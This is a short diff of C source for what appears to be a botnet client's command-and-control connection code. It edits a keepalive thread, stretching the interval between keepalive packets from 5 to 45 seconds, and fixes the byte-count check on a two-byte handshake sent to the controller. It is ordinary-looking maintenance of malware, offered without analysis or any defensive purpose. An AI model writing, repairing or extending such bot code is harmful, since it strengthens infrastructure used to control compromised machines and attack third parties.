@@ -37,8 +37,6 @@ void *cnc_conn_keepalive() {
     debug_printf("Starting keepalive thread %d", pthread_self());
 
     while (is_cnc_connected()) {
-        SLEEP(5);
-
         int64_t unixTime = get_sys_milliseconds();
 
         debug_printf("Sending keepalive packet %lld", unixTime);
@@ -54,6 +52,7 @@ void *cnc_conn_keepalive() {
             break;
         }
 
+        SLEEP(45);
     }
 
     debug_printf("KeepAlive Thread exiting %d", pthread_self());
@@ -64,6 +63,7 @@ void *cnc_conn_keepalive() {
 
 void init_cnc_connection() {
     conn = malloc(sizeof(cnc_conn));
+
     conn->connected = false;
     conn->mx = malloc(sizeof(pthread_mutex_t));
     conn->keepalive_thread = 0;
@@ -121,7 +121,7 @@ bool cnc_conn_open() {
     }
 
     SpectreInfo *info = get_bot_info();
-    if ((info->LittleEndian ? WRITE_SOCKET(sock, "\00\x02", 2) : WRITE_SOCKET(sock, "\00\x01", 2)) != 1) {
+    if ((info->LittleEndian ? WRITE_SOCKET(sock, "\00\x02", 2) : WRITE_SOCKET(sock, "\00\x01", 2)) != 2) {
         debug_error("Failed to write");
         return false;
     }
